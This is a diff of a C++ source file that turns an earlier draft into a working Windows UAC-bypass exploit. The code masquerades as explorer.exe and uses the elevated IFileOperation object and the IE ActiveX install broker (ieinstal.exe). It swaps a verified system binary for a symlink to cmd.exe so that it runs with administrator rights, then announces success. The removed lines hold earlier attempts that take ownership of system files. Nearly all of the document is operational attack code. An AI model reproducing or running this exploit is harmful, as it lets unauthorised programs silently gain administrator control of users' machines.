@@ -1,9 +1,9 @@
 #include <Windows.h>
 #include <ShlObj.h>
 #include <ShObjIdl.h>
+#include <WinTrust.h>
 #include <iostream>
 #include <string>
-#include <sddl.h>
 
 #pragma region NT Stuff
 typedef struct _UNICODE_STRING
@@ -127,168 +127,331 @@ void ForgeProcessInformation(const PCWCHAR explorerPath, const RtlInitUnicodeStr
 		}, reinterpret_cast<PVOID>(&params));
 }
 
+struct IIEAdminBrokerObjectForAdminInstaller : IUnknown
+{
+	virtual HRESULT InitializeAdminInstaller(
+		BSTR providerName,
+		int unknown0,
+		BSTR* instanceUuid
+	) = 0;
+};
+
+const GUID IID_IeAxiAdminInstaller = { 0x9AEA8A59, 0xE0C9, 0x40F1, {0x87, 0xDD, 0x75, 0x70, 0x61, 0xD5, 0x61, 0x77} };
+
+struct IIEAdminBrokerObjectForInstaller2 : IUnknown
+{
+	virtual HRESULT VerifyFile(
+		BSTR instanceUuid,
+		HWND verifyParentWindow,
+		BSTR unknown0,
+		BSTR fileName,
+		BSTR unknown1,
+		ULONG uiChoice,
+		ULONG uiContext,
+		REFGUID unknown4,
+		BSTR* verifiedFileName,
+		PULONG unknown5,
+		PUCHAR* unknown6
+	) = 0;
+
+	virtual HRESULT RunSetupCommand(
+		BSTR instanceUuid,
+		HWND parentWindow,
+		BSTR commandLine,
+		BSTR infSection,
+		BSTR workingDirectory,
+		BSTR title,
+		ULONG flags,
+		PHANDLE exeHandle
+	) = 0;
+};
+
+const GUID IID_IeAxiInstaller2 = { 0xBC0EC710, 0xA3ED, 0x4F99, {0xB1, 0x4F, 0x5F, 0xD5, 0x9F, 0xDA, 0xCE, 0xA3} };
 
 int main()
 {
-	auto RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
-	auto LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));
-
-	ForgeProcessInformation(L"C:\\Windows\\explorer.exe", RtlInitUnicodeString, LdrEnumerateLoadedModules);
-
-	BIND_OPTS3 bind{};
-	bind.cbStruct = sizeof(BIND_OPTS3);
-	bind.dwClassContext = CLSCTX_LOCAL_SERVER;
-
-	//	// {88DFAF5A-9C49-454A-AE9F-84A234045DEE}
-	//	static const GUID IID_IFaxUtilityCommon = {
-	//		0x4A4EBE8E,
-	//		0x0AE27,
-	//		0x4AA3,{
-	//		0x0B7, 0x2, 0x0F3, 0x65, 0x0C4, 0x0A9, 0x0F, 0x0AC} };
-	//
-	//	static const GUID IID_ISecurityEditor = { 0x14B2C619, 0xD07A, 0x46EF, {0x8B, 0x62, 0x31, 0xB6, 0x4F, 0x3B, 0x84, 0x5C }
-	//};
-	//struct IFaxCommon
-	//{
-	//	virtual HRESULT QueryInterface(REFIID, void**) = 0;
-	//	virtual ULONG AddRef() = 0;
-	//	virtual ULONG Release() = 0;
-	//	virtual __int64 LaunchFaxConfigUI(HWND) = 0;
-	//	virtual int SendMessageToFirstWFSInstance(int, PCWSTR, UINT, __int64, __int64, PCWSTR) = 0;
-	//	virtual int SetReceiveMode(__int16*, int) = 0;
-	//	virtual int LaunchModemInstallationWizard(HWND) = 0;
-	//	virtual __int64 RestartLocalFaxService() = 0;
-	//};
-	typedef enum _SE_OBJECT_TYPE
+	PWSTR windowsPath, systemPath;
+	auto hr = SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &windowsPath);
+	if (FAILED(hr))
 	{
-		SE_UNKNOWN_OBJECT_TYPE = 0,
-		SE_FILE_OBJECT,
-		SE_SERVICE,
-		SE_PRINTER,
-		SE_REGISTRY_KEY,
-		SE_LMSHARE,
-		SE_KERNEL_OBJECT,
-		SE_WINDOW_OBJECT,
-		SE_DS_OBJECT,
-		SE_DS_OBJECT_ALL,
-		SE_PROVIDER_DEFINED_OBJECT,
-		SE_WMIGUID_OBJECT,
-		SE_REGISTRY_WOW64_32KEY,
-		SE_REGISTRY_WOW64_64KEY,
-	} SE_OBJECT_TYPE;
-	struct ISecurityEditor {
-
-		virtual HRESULT QueryInterface(
-			__RPC__in REFIID riid,
-			_COM_Outptr_  void** ppvObject) = 0;
-
-		virtual ULONG AddRef(
-		) = 0;
-
-		virtual ULONG Release() = 0;
-
-		virtual HRESULT GetSecurity(
-			_In_ LPCOLESTR ObjectName,
-			_In_ SE_OBJECT_TYPE ObjectType,
-			_In_ SECURITY_INFORMATION SecurityInfo,
-			_Out_opt_ LPCOLESTR* ppSDDLStr) = 0;
-
-		virtual HRESULT SetSecurity(
-			_In_ LPCOLESTR ObjectName,
-			_In_ SE_OBJECT_TYPE ObjectType,
-			_In_ SECURITY_INFORMATION SecurityInfo,
-			_In_ LPCOLESTR ppSDDLStr) = 0;
-	};
-
-	/*CoInitializeEx(0, COINIT_APARTMENTTHREADED);
-
-	//IFaxCommon* ppv;
-	//ISecurityEditor* editor;
-
-	//CoGetObject(L"Elevation:Administrator!new:{59347292-B72D-41F2-98C5-E9ACA1B247A2}", &bind, IID_IFaxUtilityCommon, (void**)&ppv);
-	//CoGetObject(L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}", &bind, IID_ISecurityEditor, (void**)&editor);
-
-	//LPCOLESTR str;
-
-	//editor->GetSecurity(L"C:\\Windows\\System32\\hdwwiz.cpl", SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, &str);
-	//std::wcout << str << std::endl;
-	//CoTaskMemFree((LPVOID)str);
-	//PTOKEN_USER info;
-	//DWORD len;
-
-	//GetTokenInformation(GetCurrentProcessToken(), TokenUser, nullptr, 0, &len);
-
-	//info = (PTOKEN_USER)malloc(len);
-
-	//GetTokenInformation(GetCurrentProcessToken(), TokenUser, info, len, &len);
-
-	//LPWSTR stringSid;
-
-	//ConvertSidToStringSidW(info->User.Sid, &stringSid);
-
-	//auto res = editor->SetSecurity(L"C:\\Windows\\System32\\hdwwiz.cpl", SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, L"O:S-1-5-21-3340512567-2616568518-976464959-1001");
-
-
-	//LocalFree(stringSid);
-	//free(info);
-	ppv->LaunchModemInstallationWizard(0);
-	ppv->Release();
-	//editor->Release();
-	CoUninitialize();*/
-
-	static const GUID IID_IeAxiInstaller2 =
-	{ 0x0BC0EC710, 0x0A3ED, 0x4F99, {0x0B1, 0x4F, 0x5F, 0x0D5, 0x9F, 0x0DA, 0x0CE, 0x0A3} };
-	static const GUID IID_IeAxiAdminInstaller =
-	{ 0x9AEA8A59, 0x0E0C9, 0x40F1, {0x87, 0x0DD, 0x75, 0x70, 0x61, 0x0D5, 0x61, 0x77} };
-
-	struct IIEAdminBrokerObjectAdminInstaller : IUnknown
+		std::wcout << L"SHGetKnownFolderPath() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+	hr = SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &systemPath);
+	if (FAILED(hr))
 	{
-		virtual HRESULT InitializeAdminInstaller(
-			PCWSTR Name, int Unknown0, PWSTR* Uuid
-		) = 0;
-	};
+		CoTaskMemFree(windowsPath);
+		std::wcout << L"SHGetKnownFolderPath() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
 
-	struct IIEAdminBrokerObjectInstaller2 : IUnknown
+	std::wstring explorer{ windowsPath }, system32{ systemPath };
+	CoTaskMemFree(windowsPath);
+	CoTaskMemFree(systemPath);
+	explorer += L"\\explorer.exe";
+
+	const auto RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(
+		GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
+	const auto LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(
+		GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));
+
+	ForgeProcessInformation(explorer.c_str(), RtlInitUnicodeString, LdrEnumerateLoadedModules);
+
+	hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
+	if (FAILED(hr))
 	{
-		virtual HRESULT VerifyFile(
-			PCWSTR, HWND__*, PCWSTR, PCWSTR, PCWSTR, ULONG, ULONG, _GUID const&, PCWSTR*, PULONG, PUCHAR*
-		) = 0;
-		virtual HRESULT RunSetupCommand() = 0;
-		/*virtual HRESULT InstallFile() = 0;
-		virtual HRESULT RegisterExeFile() = 0;
-		virtual HRESULT RegisterDllFile() = 0;
-		virtual HRESULT InstallCatalogFile() = 0;
-		virtual HRESULT UpdateLanguageCheck() = 0;
-		virtual HRESULT UpdateDistributionUnit() = 0;
-		virtual HRESULT UpdateModuleUsage() = 0;
-		virtual HRESULT EnumerateFiles() = 0;
-		virtual HRESULT ExtractFiles() = 0;
-		virtual HRESULT RemoveExtractedFilesAndDirs() = 0;
-		virtual HRESULT CreateExtensionsManager() = 0;
-		virtual HRESULT RegisterDllFile2() = 0;
-		virtual HRESULT UpdateDistributionUnit2() = 0;*/
-	};
+		std::wcout << L"CoInitializeEx() failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+	hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE,
+		nullptr, 0, nullptr);
+	if (FAILED(hr))
+	{
+		std::wcout << L"CoInitializeSecurity() failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		CoUninitialize();
+		return EXIT_FAILURE;
+	}
 
-	IIEAdminBrokerObjectAdminInstaller* adminInstaller;
-	IIEAdminBrokerObjectInstaller2* installer;
-	PWSTR uuid;
+	IFileOperation* fileOperation;
+	IIEAdminBrokerObjectForAdminInstaller* adminInstaller;
+	BIND_OPTS3 bindOptions{};
 
-	HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
+	bindOptions.dwClassContext = CLSCTX_LOCAL_SERVER;
+	bindOptions.cbStruct = sizeof BIND_OPTS3;
 
-	hr = CoGetObject(L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}", &bind, IID_IeAxiAdminInstaller, (void**)&adminInstaller);
+	hr = CoGetObject(L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}", &bindOptions, IID_IFileOperation,
+		reinterpret_cast<void**>(&fileOperation));
+	if (FAILED(hr))
+	{
+		CoUninitialize();
+		std::wcout << L"CoGetObject() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+	hr = CoGetObject(L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}", &bindOptions, IID_IeAxiAdminInstaller,
+		reinterpret_cast<void**>(&adminInstaller));
+	if (FAILED(hr))
+	{
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"CoGetObject() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
 
-	hr = adminInstaller->InitializeAdminInstaller(0, 0, &uuid);
-	hr = adminInstaller->QueryInterface(IID_IeAxiInstaller2, (void**)&installer);
+	hr = fileOperation->SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI);
+	if (FAILED(hr))
+	{
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"IFileOperation::SetOperationFlags() failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
 
-	PCWSTR name{ 0 };
-	void* ptr;
-	PCWSTR d;
-	PUCHAR a;
-	ULONG p{ 0 };
+	system32 += L"\\bdeunlock.exe";
 
-	hr = installer->VerifyFile(uuid, 0, L"C:\\Windows\\notepad.exe", L"C:\\Windows\\notepad.exe", L"C:\\Windows\\notepad.exe", 0, 0, IID_IUnknown, &d, &p, &a);
+	/*
+	 * Begin ieinstal.exe -> CIEAdminBrokerObject::CActiveXInstallBroker
+	 */
 
-	installer->Release();
+	BSTR instanceUuid;
+
+	hr = adminInstaller->InitializeAdminInstaller(nullptr, 0, &instanceUuid);
+	if (FAILED(hr))
+	{
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"ieinstal.exe -> CIEAdminBrokerObject::InitializeAdminInstaller() failed. HRESULT: 0x" <<
+			std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	IIEAdminBrokerObjectForInstaller2* installer2;
+
+	hr = adminInstaller->QueryInterface(IID_IeAxiInstaller2, reinterpret_cast<void**>(&installer2));
+	if (FAILED(hr))
+	{
+		SysFreeString(instanceUuid);
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"ieinstal.exe -> CIEAdminBrokerObject::QueryInterface() failed. HRESULT: 0x" <<
+			std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	BSTR fileName = SysAllocString(system32.c_str()), targetFile;
+	ULONG unknown5;
+	PUCHAR unknown6;
+
+	hr = installer2->VerifyFile(instanceUuid, static_cast<HWND>(INVALID_HANDLE_VALUE), fileName, fileName, nullptr,
+	                            WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, IID_IUnknown, &targetFile, &unknown5, &unknown6);
+	SysFreeString(fileName);
+	if (FAILED(hr))
+	{
+		SysFreeString(instanceUuid);
+		installer2->Release();
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"ieinstal.exe -> CIEAdminBrokerObject::VerifyFile() failed. HRESULT: 0x" <<
+			std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	WCHAR file[25], directory[MAX_PATH - 2], drive[3], fullPath[MAX_PATH]{};
+
+	_wsplitpath_s(targetFile, drive, sizeof drive / sizeof(WCHAR), directory, sizeof directory / sizeof(WCHAR), file,
+	              sizeof file / sizeof(WCHAR), nullptr, 0);
+	wcscat_s(file, sizeof file / sizeof(WCHAR), L".exe");
+	wcscat_s(fullPath, sizeof fullPath / sizeof(WCHAR), drive);
+	wcscat_s(fullPath, sizeof fullPath / sizeof(WCHAR), directory);
+	
+	CoTaskMemFree(unknown6);
+
+	IShellItem* existingItem, * parentFolder, * newItem;
+
+	system32 = system32.substr(0, system32.find(L"\\bdeunlock.exe"));
+	system32 += L"\\cmd.exe";
+	if (!CreateSymbolicLinkW(file, system32.c_str(), SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE))
+	{
+		std::wcout << L"CreateSymbolicLinkW() failed. Error: " << GetLastError() << std::endl;
+		SysFreeString(targetFile);
+		SysFreeString(instanceUuid);
+		installer2->Release();
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		return EXIT_FAILURE;
+	}
+
+	const auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr)) + wcslen(file) + 1;
+	auto currentDirectory = new WCHAR[requiredSize];
+	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
+	wcscat_s(currentDirectory, requiredSize, L"\\");
+	wcscat_s(currentDirectory, requiredSize, file);
+	
+	hr = SHCreateItemFromParsingName(currentDirectory, nullptr, IID_IShellItem, reinterpret_cast<void**>(&newItem));
+	delete[] currentDirectory;
+	if (FAILED(hr))
+	{
+		DeleteFileW(file);
+		SysFreeString(targetFile);
+		SysFreeString(instanceUuid);
+		installer2->Release();
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"SHCreateItemFromParsingName() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+	hr = SHCreateItemFromParsingName(targetFile, nullptr, IID_IShellItem, reinterpret_cast<void**>(&existingItem));
+	if (FAILED(hr))
+	{
+		newItem->Release();
+		DeleteFileW(file);
+		SysFreeString(targetFile);
+		SysFreeString(instanceUuid);
+		installer2->Release();
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"SHCreateItemFromParsingName() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+	hr = SHCreateItemFromParsingName(fullPath, nullptr, IID_IShellItem, reinterpret_cast<void**>(&parentFolder));
+	if (FAILED(hr))
+	{
+		existingItem->Release();
+		newItem->Release();
+		DeleteFileW(file);
+		SysFreeString(targetFile);
+		SysFreeString(instanceUuid);
+		installer2->Release();
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"SHCreateItemFromParsingName() (2) failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	hr = fileOperation->DeleteItem(existingItem, nullptr);
+	if (FAILED(hr))
+	{
+		parentFolder->Release();
+		existingItem->Release();
+		newItem->Release();
+		DeleteFileW(file);
+		SysFreeString(targetFile);
+		SysFreeString(instanceUuid);
+		installer2->Release();
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"IFileOperation::DeleteItem() failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+	hr = fileOperation->MoveItem(newItem, parentFolder, nullptr, nullptr);
+	if (FAILED(hr))
+	{
+		parentFolder->Release();
+		existingItem->Release();
+		newItem->Release();
+		DeleteFileW(file);
+		SysFreeString(targetFile);
+		SysFreeString(instanceUuid);
+		installer2->Release();
+		adminInstaller->Release();
+		fileOperation->Release();
+		CoUninitialize();
+		std::wcout << L"IFileOperation::MoveItem() failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+	hr = fileOperation->PerformOperations();
+	parentFolder->Release();
+	existingItem->Release();
+	newItem->Release();
+	fileOperation->Release();
+	DeleteFileW(file);
+	if (FAILED(hr))
+	{
+		SysFreeString(targetFile);
+		SysFreeString(instanceUuid);
+		installer2->Release();
+		adminInstaller->Release();
+		CoUninitialize();
+		std::wcout << L"IFileOperation::PerformOperations() failed. HRESULT: 0x" << std::hex << hr << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	system32 = system32.substr(0, system32.find(L"\\cmd.exe"));
+	const auto workingDirectory = SysAllocString(system32.c_str());
+
+	HANDLE exeHandle;
+	hr = installer2->RunSetupCommand(instanceUuid, nullptr, targetFile, const_cast<BSTR>(L""), workingDirectory,
+	                                 const_cast<BSTR>(L""), 0, &exeHandle);
+	SysFreeString(workingDirectory);
+	SysFreeString(targetFile);
+	SysFreeString(instanceUuid);
+	installer2->Release();
 	adminInstaller->Release();
 	CoUninitialize();
+	if (hr != E_INVALIDARG)
+		std::wcout << L"ieinstal.exe -> CIEAdminBrokerObject::RunSetupCommand() did not return the expected value (E_INVALIDARG).\n";
+	
+	/*
+	 * End ieinstal.exe -> CIEAdminBrokerObject::CActiveXInstallBroker
+	 */
+
+	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
+	std::wcout << L"[";
+	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);
+	std::wcout << L"@";
+	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
+	std::wcout << L"] ";
+	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
+	std::wcout << L"*** Exploit successful.\n\n";
+	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
+
+	return 0;
 }
